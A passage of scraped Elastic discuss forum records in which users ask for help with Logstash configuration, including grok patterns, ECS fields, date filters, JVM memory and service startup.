unexpectedly.\\n at System.Net.WebClient.UploadDataInternal(Uri address, String method, Byte[] data, WebRequest& request)\\n at System.Net.WebClient.UploadData(Uri address, String method, Byte[] data)\\n at Metrics.InfluxDB.Adapters.InfluxdbHttpWriter.WriteToTransport(Byte[] bytes)\" }, \"log_name\": \"Application\", \"computer_name\": \"vfdest1app1.dynacommercelab.com\" }, \"fields\": { \"@timestamp\": [ \"2020-04-16T15:06:22.000Z\" ] }, \"sort\": [ 1587049582000 ] } ELK version is 6.5. how can I implement ECS here? is it applicable in elk version 6.*. because when I tried a demo in my local with elk version 7.6, I can see this kind of logs { \"_index\": \"logstash-2020.04.16-000001\", \"_type\": \"_doc\", \"_id\": \"Qn3JgnEBHPoQW-P2PFG_\", \"_version\": 1, \"_score\": null, \"_source\": { \"ecs\": { \"version\": \"1.4.0\" }, \"log\": { \"offset\": 6225, \"file\": { \"path\": \"/Applications/XAMPP/xamppfiles/logs/access_log\" } }, \"input\": { \"type\": \"log\" }, \"host\": { \"id\": \"58F3EB84-30F4-5DEF-B9D2-02705BF2403E\", \"name\": \"DynaCommerces-MacBook-Pro.local\", \"architecture\": \"x86_64\", \"os\": { \"platform\": \"darwin\", \"kernel\": \"19.3.0\", \"version\": \"10.15.3\", \"name\": \"Mac OS X\", \"family\": \"darwin\", \"build\": \"19D76\" }, \"hostname\": \"DynaCommerces-MacBook-Pro.local\" }, \"container\": { \"id\": \"access_log\" }, \"message\": \"::1 - - [16/Apr/2020:17:09:16 +0530] \\\"GET /dashboard/images/favicon.png HTTP/1.1\\\" 200 2508\", \"tags\": [ \"_grokparsefailure\", \"_geoip_lookup_failure\" ], \"@timestamp\": \"2020-04-16T11:39:17.213Z\", \"@version\": \"1\", \"agent\": { \"ephemeral_id\": \"dd55171b-95a0-416f-baa0-e093209dde1d\", \"id\": \"55702d48-8015-446a-b833-972797967855\", \"version\": \"7.6.2\", \"hostname\": \"DynaCommerces-MacBook-Pro.local\", \"type\": \"filebeat\" } }, \"fields\": { \"@timestamp\": [ \"2020-04-16T11:39:17.213Z\" ] }, \"sort\": [ 1587037157213 ] } how can i update my old logs with this current ECS logs structure. thanks in advance!!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a69a4693-0ef5-490a-97e6-ae841683313c",
    "url": "https://discuss.elastic.co/t/how-to-check-multiple-values-using-if-else-condition-in-field-and-add-new-values-to-another-field/228331",
    "title": "How to check multiple values using if else condition in field and add new values to another field?",
    "category": [
      "Logstash"
    ],
    "author": "Emna1",
    "date": "April 16, 2020, 1:35pm April 16, 2020, 3:11pm April 16, 2020, 3:10pm",
    "body": "HI, I want to add a code which contains if else conditions which helps me to add values ​​to a new field according to conditions on another field. for example; Blockquote if [Duration] >= 360 { mutate { add_field => { \"Price\" => \"50$\" } } else if duration between two values add to the same field \" Price\" another value like 25$ .... Blockquote Please i will appreciate any help and thanks !!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "492c1e55-c848-465c-906e-5fd416088e01",
    "url": "https://discuss.elastic.co/t/parsing-events-before-forwarding/228330",
    "title": "Parsing events before forwarding",
    "category": [
      "Logstash"
    ],
    "author": "calebhoch",
    "date": "April 16, 2020, 1:32pm April 16, 2020, 1:41pm April 16, 2020, 2:41pm April 16, 2020, 2:55pm",
    "body": "Hi there, we're looking into leveraging Logstash to forward our system logs to our SIEM, QRadar. I wanted to know if there is a way to filter out specific events with Logstash before forwarding onto QRadar. Any help or documentation is much appreciated!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "385ecb72-382a-4be9-8b5e-e5618ddc6790",
    "url": "https://discuss.elastic.co/t/how-to-prevent-an-occurence-of-aggregatefinalflush-tag/228284",
    "title": "How to prevent an occurence of _aggregatefinalflush tag?",
    "category": [
      "Logstash"
    ],
    "author": "vasek",
    "date": "April 16, 2020, 10:31am April 16, 2020, 2:09pm April 16, 2020, 2:09pm April 16, 2020, 2:23pm",
    "body": "Hello, can someone help me how to prevent an occurence of _aggregatefinalflush tag? aggregate { ... timeout => 5 timeout_tags => [] }",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0f7b0f13-769f-4858-8773-7887d8fd498d",
    "url": "https://discuss.elastic.co/t/conditional-filter-issue/227990",
    "title": "Conditional Filter issue",
    "category": [
      "Logstash"
    ],
    "author": "bikramsingh",
    "date": "April 14, 2020, 8:20pm April 15, 2020, 8:51am April 15, 2020, 4:18pm April 16, 2020, 1:54pm",
    "body": "I have this filter in the config file, i trying to validate it using in build test config functionality. I am getting error. filter { if( \"Network Login\" in [message]){ if(\"caps_fail\" in [message]){ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp}\"} } }else{ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp}\"} } } #outer else }else{ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp\"} } } I cut shot the grok patterns. I tested these patterns in the debugger before putting them here. Here is the error message after running : /bin/logstash --config.test_and_exit -f logstash.conf [FATAL] 2020-04-14 13:01:56.137 [LogStash::Runner] runner - The given configuration is invalid. Reason: Expected one of [ \\t\\r\\n], \"#\", \"{\", \"}\" at line 20, column 17 (byte 1279) after filter { if( \"Network Login\" in [message]){ if(\"caps_fail\" in [message]){ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp}\"} } }else{ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp}\"} } } #outer else }else{ grok{ match =>{\" [ERROR] 2020-04-14 13:01:56.140 [LogStash::Runner] Logstash - java.lang.IllegalStateException: Logstash stopped processing because of an error: (SystemExit) exit I am trying to extract data based on strings present in the log and trying to use nested if statements. I still want to next three if statements. Not able to figure out what is wrong. Please help, Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dbabd4e2-1c58-4bee-9ab3-8828bcef0430",
    "url": "https://discuss.elastic.co/t/how-to-parse-load-json-file-or-txt-file-containing-json-to-logstash-using-grok/228246",
    "title": "How to parse/load JSON file or .TXT file containing JSON to logstash using GROK",
    "category": [
      "Logstash"
    ],
    "author": "Dhruv_Mevada",
    "date": "April 16, 2020, 10:03am April 20, 2020, 8:50am April 20, 2020, 8:50am April 16, 2020, 10:42am April 20, 2020, 8:50am",
    "body": "I'm new in ELK & I have logs in JSON format & I can save it to JSON file or txt file. Now, Which will be a better approach should I save logs to JSON file or txt file? How should I parse/load the logs to Logstash, what will be the configuration file of Logstash? Sample logs {\"time\":\"2019-04-15 5:00:00\",\"log-level\":\"INFO\",\"operation\":\"database\",\"module\":\"call-manager\",\"event\":\"call\",\"message\":\"Call initiated\"} {\"time\":\"2019-04-15 5:01:00\",\"log-level\":\"INFO\",\"operation\":\"database\",\"module\":\"call-manager\",\"event\":\"call\",\"message\":\"Call initiated\"} I tried with below configuration but not works Logstash configuration file input { file { type => \"json\" path => \"/home/dhruv/logs.txt\" start_position => beginning } } filter { json { source => \"message\" } } output { elasticsearch { hosts => [\"localhost:9220\"] index => \"call_manager\" } } I want to parse every key present in the logs. Can anyone please help me out with the configuration file. Thanks in advance..",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "dbb1cb7d-06f1-495d-aa46-bd7cad3244a1",
    "url": "https://discuss.elastic.co/t/i-want-to-create-grok-pattern-for-custom-log/227143",
    "title": "I want to create grok pattern for custom log",
    "category": [
      "Logstash"
    ],
    "author": "Atul_Gunjal",
    "date": "April 8, 2020, 1:58pm April 8, 2020, 2:13pm April 8, 2020, 2:27pm April 8, 2020, 4:02pm April 9, 2020, 4:16am April 9, 2020, 2:42pm April 16, 2020, 10:21am",
    "body": "Hi, Following is a log-pattern and I tried creating one but it didn't work. Log: 2020-04-07 00:00:02 Local0 Info 00:00:01:911 DMSTST-TBOX.DEV.cloud.companyname.com DEV\\DMSTST-TBOX$|17352|DICOM Service VMSDBD_SVC_DICOM 008940/Remote Implementation Class UID: '1.2.276.0.7230010.3.0.3.6.3', Implementation Version Name: 'OFFIS_DCMTK_363' Pattern: %{TIMESTAMP_ISO8601:date} \\t %{KEYWORD:typedata} %{KEYWORD:loglevel} %{GREEDYDATA} %{KEYWORD:host} %{KEYWORD:serviceinfo} %{KEYWORD:component} %{TEXT:messagefield} Can anyone help me with this?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b78a3916-aec1-48a9-86dd-6e36c5689734",
    "url": "https://discuss.elastic.co/t/cron-jobs-in-http-poller/227305",
    "title": "Cron jobs in http_poller",
    "category": [
      "Logstash"
    ],
    "author": "akhilsharma.in",
    "date": "April 9, 2020, 11:38am April 9, 2020, 11:39am April 16, 2020, 8:47am",
    "body": "Hi, I'm using http_poller in input and running it via cron job. I have scheduled it for everyday as per my understanding but it is running every 48 hours. Please assist. Cron job: cron => \"0 5 1-31 * * UTC\" Platform: Linux Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9685ade3-2e92-47b9-898e-b238b78dcffa",
    "url": "https://discuss.elastic.co/t/parse-and-query-k8s-haproxy-logs-by-logstash-pipeline-filter-filebeat-and-kibana/228276",
    "title": "Parse and query K8S HAproxy logs by Logstash pipeline filter, filebeat and Kibana",
    "category": [
      "Logstash"
    ],
    "author": "lsambolino",
    "date": "April 16, 2020, 8:38am",
    "body": "Hi, I am relatively new to ELK. I am trying to parse the K8S HAproxy containers logs via GROK inside the filter config in Logstash. My goal is to query haproxy logs fields easily. On the Kubernetes side, I've deployed filebeat on every pod via K8S yaml deployment succesfully. Data is being sent to Logstash and then forwarded to Elasticsearch. From what I can see from Kibana, filebeats logs are correctly flowing: image1440×492 66.2 KB I've built multiple pipelines. Each pipeline is structured as follows: 01-input.conf input { beats { port => 5012 ssl => false ssl_verify_mode => \"none\" } } (port change for every pipeline) 02-filter.conf ... if [kubernetes][labels][service] == 'haproxy' { grok { match => { \"message\" => \"%{DATE:logdate} %{NUMBER:uriresponde} %{WORD:urimethod} %{URIPATHPARAM:requestedpath} %{WORD:uriversion} %{IP:sourceip} %{PORT:sourceport} %{IP:destip} %{WORD:targeturl} %{NUMBER:firstdigit} %{NUMBER:seconddigit} %{NUMBER:thirddigit} %{NUMBER:fourthdigit} %{NUMBER:fifthdigit} %{WORD:separation} %{WORD:httpstring} %{WORD:anotherurl} } ... 03-output.conf output { if [type] != \"container_clone\" { elasticsearch { template_overwrite => true index => \"logstash_7-%{+YYYY.MM.dd}\" document_id => \"%{[@metadata][fingerprint]}\" hosts => [\"https://ourmonitorip:9200\"] user => 'logstash' password => 'logstash' } } else if [type] == \"container_clone\" { file { codec => line { format => \"%{message}\" } path => \"/var/log/logstash/container/%{+YYYY}/%{+MM}/%{+dd}/%{env}/%{service_name}-ourmonitorip.log\" } } } Here an example of haproxy log row: '15/Apr/2020:18:52:41.041','200','GET /dev/nameoftheapp/ HTTP/1.1','SO.UR.CE.IP','277','DES.TIN.ATION.IP','dev-nameoofoneappon-default','0','150','0','1','1','--','http:0AF401EBD3080AF4054 ourinternalservice.ourdomain' From the kibana dashboard, I am not able to query one of the field I declared in grok: image916×336 32.2 KB What am I missing ? Thank you in advance",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9f142197-471e-4127-bd7c-94b820d4f1ee",
    "url": "https://discuss.elastic.co/t/how-logstash-or-filebeat-determins-the-type-of-logs/227779",
    "title": "How Logstash or filebeat determins the type of logs?",
    "category": [
      "Logstash"
    ],
    "author": "gauravbhutani30",
    "date": "April 13, 2020, 1:44pm April 16, 2020, 7:33am",
    "body": "How does the logstash or the filebeat determine the type of logs, we just provide \"type = syslogs\" or any other. I want to parse a custom log file, which has text in it. Please help!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fe060d4f-c229-4e68-8667-d78d0f612c60",
    "url": "https://discuss.elastic.co/t/missing-event-while-report-to-elastic-search/228262",
    "title": "Missing event while report to elastic search",
    "category": [
      "Logstash"
    ],
    "author": "gyana_nayak",
    "date": "April 16, 2020, 7:15am",
    "body": "Hi All, i could see some events are missing while reporting logs to elastic search. Take an example i am sending 5 logs event only 4 or 3 are reporting. Basically i am using logstash 7.4 to read my log messages and store the information on elastic search 7.4. below is my logstash configuration input { file { type => \"web\" path => [\"/Users/znrind-a0053/Downloads/logs/**/*-web.log\"] start_position => \"beginning\" sincedb_path => \"/tmp/sincedb_file\" codec => multiline { pattern => \"^(%{MONTHDAY}-%{MONTHNUM}-%{YEAR} %{TIME}) \" negate => true what => previous } } } filter { if [type] == \"web\" { grok { match => [ \"message\",\"(?<frontendDateTime>%{MONTHDAY}-%{MONTHNUM}-%{YEAR} %{TIME})%{SPACE}(\\[%{DATA:thread}\\])?( )?%{LOGLEVEL:level}%{SPACE}%{USERNAME:zhost}%{SPACE}%{JAVAFILE:javaClass} %{USERNAME:orgId} (?<loginId>[\\w.+=:-]+@[0-9A-Za-z][0-9A-Za-z-]{0,62}(?:[.](?:[0-9A-Za-z][0-9A-Za-z‌​-]{0,62}))*) %{GREEDYDATA:jsonstring}\"] } json { source => \"jsonstring\" target => \"parsedJson\" remove_field=>[\"jsonstring\"] } mutate { add_field => { \"actionType\" => \"%{[parsedJson][actionType]}\" \"errorMessage\" => \"%{[parsedJson][errorMessage]}\" \"actionName\" => \"%{[parsedJson][actionName]}\" \"Payload\" => \"%{[parsedJson][Payload]}\" \"pageInfo\" => \"%{[parsedJson][pageInfo]}\" \"browserInfo\" => \"%{[parsedJson][browserInfo]}\" \"dateTime\" => \"%{[parsedJson][dateTime]}\" } } } } output{ if \"_grokparsefailure\" in [tags] { elasticsearch { hosts => \"localhost:9200\" index => \"grokparsefailure-%{+YYYY.MM.dd}\" } } else { elasticsearch { hosts => \"localhost:9200\" index => \"zindex\" } } stdout{codec => rubydebug} } below is my sample logs 05-04-2020 13:38:18 [z-weblog-writer] INFO z-weblog-writer WebLogQueueListner z2store abc.nayak@abc.com {\"dateTime\":\"02-04-2019 20:17:18\",\"actionType\":\"UI Render\",\"errorMessage\":\"TypeError: Cannot read property 'name' of undefined\",\"pageInfo\":\"appId ZOrganization moduleId ZEntityConfig pageId entityConfigGrid\",\"Payload\":\"payload\",\"browserInfo\":\"Chrome 8000\",\"actionName\":\"Unexpected Error\"} 05-04-2020 13:38:18 [z-weblog-writer] INFO z-weblog-writer WebLogQueueListner z2store abc.nayak@abc.com {\"dateTime\":\"01-04-2019 20:17:18\",\"actionType\":\"UI Render\",\"errorMessage\":\"TypeError: Cannot read property 'name' of undefined\",\"pageInfo\":\"appId : ZOrganization, moduleId: ZEntityConfig, pageId:entityConfigGrid\",\"Payload\":\"payload\",\"browserInfo\":\"Chrome 8000\",\"actionName\":\"Unexpected Error\"} 05-04-2020 13:43:32 [z-weblog-writer] INFO z-weblog-writer WebLogQueueListner z2store abc.nayak@abc.com {\"dateTime\":\"02-04-2019 20:17:18\",\"actionType\":\"UI Render\",\"errorMessage\":\"TypeError: Cannot read property 'name' of undefined\",\"pageInfo\":\"appId ZOrganization moduleId ZEntityConfig pageId entityConfigGrid\",\"Payload\":\"payload\",\"browserInfo\":\"Chrome 8000\",\"actionName\":\"Unexpected Error\"} 05-04-2020 13:43:32 [z-weblog-writer] INFO z-weblog-writer WebLogQueueListner z2store abc.nayak@abc.com {\"dateTime\":\"01-04-2019 20:17:18\",\"actionType\":\"UI Render\",\"errorMessage\":\"TypeError: Cannot read property 'name' of undefined\",\"pageInfo\":\"appId : ZOrganization, moduleId: ZEntityConfig, pageId:entityConfigGrid\",\"Payload\":\"payload\",\"browserInfo\":\"Chrome 8000\",\"actionName\":\"Unexpected Error\"} i couldn't figure out why this issue is happening. Any suggestion would be helpful.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "87a492d9-f55f-4965-98f5-6d28a8a41e3b",
    "url": "https://discuss.elastic.co/t/how-to-set-index-as-interface-ip-dynamically-in-elasticsearch/228114",
    "title": "How to set index as interface ip dynamically in elasticsearch",
    "category": [
      "Logstash"
    ],
    "author": "mmk",
    "date": "April 16, 2020, 7:12am",
    "body": "I am using below config to create index (IP and date), actually i will be running logstash in different host and i want to differentiate each host logs with index value. so i have decided to use interface ip and host name to differentiate each host(in few cases host name will be same so i want to use combination of hostname and interface ip). i have exported the IP in my linux environment but i am getting error. output { elasticsearch { hosts => [\"192.168.XXX.XXX:9200\"] index => \"${IP}-%{+YYYY.MM.dd}\" } } error : Cannot evaluate ${IP}. Replacement variable IP is not defined in a Logstash secret store or as an Environment entry and there is no default value given.\" Is it mandatory to add at /etc/default/logstash, because for me when i add at /etc/default/logstash and also if i export the IP in my linux environment then only it is working as expected. Do we have other way? can any one help me",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3ca62a83-6966-4f47-9ad2-54672ae8db03",
    "url": "https://discuss.elastic.co/t/logstash-syslog-plugin-ssl/228256",
    "title": "Logstash syslog plugin SSL",
    "category": [
      "Logstash"
    ],
    "author": "RAM_NATHAN",
    "date": "April 16, 2020, 6:30am",
    "body": "Can I implement basic SSL security between my source and logstash Syslog plugin without any third party tools?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "1ebe1c34-4173-4397-8cb4-239435c10f90",
    "url": "https://discuss.elastic.co/t/splitting-a-string-into-chunks-of-a-certain-size/228252",
    "title": "Splitting a string into chunks of a certain size",
    "category": [
      "Logstash"
    ],
    "author": "Sakthi_Svm",
    "date": "April 16, 2020, 6:05am",
    "body": "Hi, I'm in need to split a string in to multiple sub-string of same size. Is it possible to split by same or min length using ruby code? Pasted my message below, {\"Name1 True Name2 True Name3 True Name4 True\" } Expected result on split, [0]. Name1 True [1], Name2 True [2], Name3 False [3], Name4 True",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5aed49d3-a17a-4bfa-b87a-94df0d4f805f",
    "url": "https://discuss.elastic.co/t/input-blocking-when-output-is-unavailable/227661",
    "title": "Input blocking when output is unavailable",
    "category": [
      "Logstash"
    ],
    "author": "orweinberger",
    "date": "April 12, 2020, 9:47am April 16, 2020, 5:25am",
    "body": "I have a TCP input that receives messages, a few filters and a single Elasticsearch output. I'm running a small script that sends messages to the LS TCP port every X miliseconds. After experimenting a bit, I have a few questions: Since Logstash persistent queues does not support TCP inputs, is there any mechanism (other than a message queue) that I can implement to 'guard' myself from long lasting ES downtime? I assumed that if Elasticsearch is down, messages will be stored in-memory, however this is not reflected when I curl http://localhost:9600/_node/stats/pipelines, the pipelines.main.events.in count stops climbing as soon as ES is down, is there another place I should look for to see the in-memory queue count? I've used the redis output in the past and it has a congestion_threshold parameter, is it possible to theoretically implement the same in the elasticsearch output? Does that even block the input, or just blocks the output? Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "90a40f94-6a5b-4578-b856-8b5394538a30",
    "url": "https://discuss.elastic.co/t/logstash-memory-requirements-and-jvm-sizing/227072",
    "title": "Logstash Memory Requirements and JVM Sizing",
    "category": [
      "Logstash"
    ],
    "author": "shrikantgulia",
    "date": "April 8, 2020, 7:49am April 9, 2020, 8:30am April 9, 2020, 9:25am April 9, 2020, 9:30am April 9, 2020, 9:35am April 9, 2020, 9:48am April 9, 2020, 11:08am April 9, 2020, 11:15am April 16, 2020, 5:02am",
    "body": "Hello I am getting approx 5000 events per second and a lot of Grok, KV, DNS filters are being used. My current memory is 16 GB, 8 Core thread per core is 2. I have set JVM size to 8GB. But My JVM is getting full and Logstash is getting shut down and many events are getting dropped. Please advice me Stay Safe and Search! Regards",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "0ce2cedc-b111-495c-810c-71de4ff3b960",
    "url": "https://discuss.elastic.co/t/logstash-and-filebeat-picking-up-the-old-files-again-and-again/228163",
    "title": "Logstash and filebeat picking up the old files again and again",
    "category": [
      "Logstash"
    ],
    "author": "Ananya_Mohiley",
    "date": "April 15, 2020, 3:52pm April 15, 2020, 5:43pm April 16, 2020, 3:51am",
    "body": "i have configured logstash and filebeat on localhost however even when there is no updation of files in the folder the elasticsearch index is being populated by same files repetitively pl suggest remedial measures",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ca1c9d92-69cd-4d13-9cdd-66e1de5a446f",
    "url": "https://discuss.elastic.co/t/kibana-displays-wrong-time/228056",
    "title": "Kibana displays wrong time",
    "category": [
      "Logstash"
    ],
    "author": "vikramaddagulla",
    "date": "April 15, 2020, 8:09am April 15, 2020, 2:44pm April 15, 2020, 3:44pm April 19, 2020, 6:47am",
    "body": "Hello, I have a log file and I am sending that from beats --> logstash --> elastic --> kibana. Below are two lines in the log file : 172.27.88.123 2020-04-15T02:54:15.054Z GET /em 302 311 0.002 172.27.88.123 2020-04-15T02:54:16.054Z GET /em/console/home 302 533 0.004 Grok is as below : match => [\"message\", \"%{IPORHOST:clientip}%{SPACE}%{TIMESTAMP_ISO8601:timestamp}%{SPACE}%{WORD:method}%{SPACE}%{NOTSPACE:request}%{SPACE}%{NUMBER:response}%{SPACE}%{NUMBER:bytes}%{SPACE}%{NUMBER:timetaken}\"] And then the below lines to convert the timestamp into @timestamp mutate { add_field => { \"newtimestamp\" => \"%{timestamp}\" } remove_field => [\"timestamp\"] } date { #match => [ \"newtimestamp\" , \"yyyy-MM-dd'T'HH:mm:ss'Z'\" ] match => [ \"newtimestamp\" , \"ISO8601\" ] timezone => \"America/New_York\" target => \"@timestamp\" } The timestamp value in the index looks like below : \"@timestamp\" : \"2020-04-15T02:39:38.039Z\", However, when I try to view this in Kibana, The time in the indexed data goes back by 4 hours. I tried to change the settings of kibana to America/New_York but no luck. Any suggestions ??",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "86d612b6-8e9b-4aeb-8d2e-eccc77d6ad6d",
    "url": "https://discuss.elastic.co/t/date-filter-cant-read-from-fieldnames-which-contain-dots-created-by-the-json-filter/228200",
    "title": "Date filter can't read from fieldnames which contain dots (created by the JSON filter)",
    "category": [
      "Logstash"
    ],
    "author": "dreamspy",
    "date": "April 15, 2020, 8:07pm April 15, 2020, 9:19pm April 16, 2020, 12:25am",
    "body": "Hi I'm having some problems reading timestamps from nested JSON fields. Let's say I have this JSON document: {\"time\" : \"2020-04-15T19:17:03.195641\"} and I read it with logstash using this filter: filter { json { source => \"message\" } date { match => [ \"time\", \"ISO8601\"] } } then everyting works fine and the @timestamp is updated correctly. But now let's say that I have a nested JSON document that looks like this: {\"subField\" : {\"time\" : \"2020-04-15T19:17:03.195641\"}} then when I index the document, the JSON input plugin creates a field called subField.time, so I would expect this config to work: filter { json { source => \"message\" } date { match => [ \"subField.time\", \"ISO8601\"] } } But this time around, the @timestamp is not read, and logstash just uses the current local time. Is there any trick to reading in timestamps from fields with dots in their name? regards Frimann",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0f5c6465-2646-4d5d-aaf0-24a765cebf8b",
    "url": "https://discuss.elastic.co/t/cannot-send-logs-from-logstash-to-elasticsearch-using-systemctl/228209",
    "title": "Cannot send logs from logstash to elasticsearch using systemctl",
    "category": [
      "Logstash"
    ],
    "author": "bikramsingh",
    "date": "April 15, 2020, 9:42pm April 15, 2020, 11:06pm April 15, 2020, 11:19pm",
    "body": "Hi when i send using \"bin/logstash -f /etc/logstash/conf.d/logstash.conf\" I am able to send logs to elasticsearch and see the index in kibana. But I am not able to send logs from logstash to elasticsearch when I am starting logastash using systemctl ($ systemctl start logastash.service) I am running this command as root user. root@develk:/etc/logstash# ps aux| grep logstash logstash 31791 3.4 20.8 4812128 842684 ? SNsl 12:15 3:58 /usr/bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -Djruby.regexp.interruptible=true -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -Dlog4j2.isThreadContextMapInheritable=true -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.13.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.10.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/javassist-3.26.0-GA.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.2.9.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/reflections-0.9.11.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash root 31953 0.0 0.0 14428 1052 pts/0 S+ 14:12 0:00 grep --color=auto logstash From logs it appears that logstash is working, here is the tail message from the log file: [2020-04-15T14:11:10,190][DEBUG][logstash.instrument.periodicpoller.jvm] collector name {:name=>\"ParNew\"} [2020-04-15T14:11:10,193][DEBUG][logstash.instrument.periodicpoller.jvm] collector name {:name=>\"ConcurrentMarkSweep\"} [2020-04-15T14:11:10,340][DEBUG][org.logstash.execution.PeriodicFlush][main] Pushing flush onto pipeline. here is the logstash.yml # Settings file in YAML # # Settings can be specified either in hierarchical form, e.g.: # # pipeline: # batch: # size: 125 # delay: 5 # # Or as flat keys: # # pipeline.batch.size: 125 # pipeline.batch.delay: 5 # # ------------ Node identity ------------ # # Use a descriptive name for the node: # # node.name: test # # If omitted the node name will default to the machine's host name # # ------------ Data path ------------------ # # Which directory should be used by logstash and its plugins # for any persistent needs. Defaults to LOGSTASH_HOME/data # path.data: /var/lib/logstash # # ------------ Pipeline Settings -------------- # # The ID of the pipeline. # # pipeline.id: main # # Set the number of workers that will, in parallel, execute the filters+outputs # stage of the pipeline. # # This defaults to the number of the host's CPU cores. # # pipeline.workers: 2 # # How many events to retrieve from inputs before sending to filters+workers # # pipeline.batch.size: 125 # # How long to wait in milliseconds while polling for the next event # before dispatching an undersized batch to filters+outputs # # pipeline.batch.delay: 50 # # Force Logstash to exit during shutdown even if there are still inflight # events in memory. By default, logstash will refuse to quit until all # received events have been pushed to the outputs. # # WARNING: enabling this can lead to data loss during shutdown # # pipeline.unsafe_shutdown: false # # ------------ Pipeline Configuration Settings -------------- # # Where to fetch the pipeline configuration for the main pipeline # # path.config: path.config: /etc/logstash/conf.d # # Pipeline configuration string for the main pipeline # # config.string: # # At startup, test if the configuration is valid and exit (dry run) # # config.test_and_exit: false # # Periodically check if the configuration has changed and reload the pipeline # This can also be triggered manually through the SIGHUP signal # # config.reload.automatic: false # # How often to check if the pipeline configuration has changed (in seconds) # # config.reload.interval: 3s # # Show fully compiled configuration as debug log message # NOTE: --log.level must be 'debug' # # config.debug: false # # When enabled, process escaped characters such as \\n and \\\" in strings in the # pipeline configuration files. # # config.support_escapes: false # # ------------ Module Settings --------------- # Define modules here. Modules definitions must be defined as an array. # The simple way to see this is to prepend each `name` with a `-`, and keep # all associated variables under the `name` they are associated with, and # above the next, like this: # # modules: # - name: MODULE_NAME # var.PLUGINTYPE1.PLUGINNAME1.KEY1: VALUE # var.PLUGINTYPE1.PLUGINNAME1.KEY2: VALUE # var.PLUGINTYPE2.PLUGINNAME1.KEY1: VALUE # var.PLUGINTYPE3.PLUGINNAME3.KEY1: VALUE # # Module variable names must be in the format of # # var.PLUGIN_TYPE.PLUGIN_NAME.KEY # # modules: # # ------------ Cloud Settings --------------- # Define Elastic Cloud settings here. # Format of cloud.id is a base64 value e.g. dXMtZWFzdC0xLmF3cy5mb3VuZC5pbyRub3RhcmVhbCRpZGVudGlmaWVy # and it may have an label prefix e.g. staging:dXMtZ... 